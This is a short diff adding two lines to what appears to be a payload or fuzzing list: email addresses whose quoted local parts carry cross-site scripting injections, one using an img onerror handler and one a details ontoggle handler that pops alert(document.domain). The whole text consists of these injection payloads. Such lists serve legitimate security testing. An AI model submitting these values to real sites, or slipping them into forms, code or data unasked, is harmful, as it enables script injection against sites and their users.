@@ -1,0 +1,2 @@
+"<img/src/onerror=alert(0)"@xss.com
+"mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com
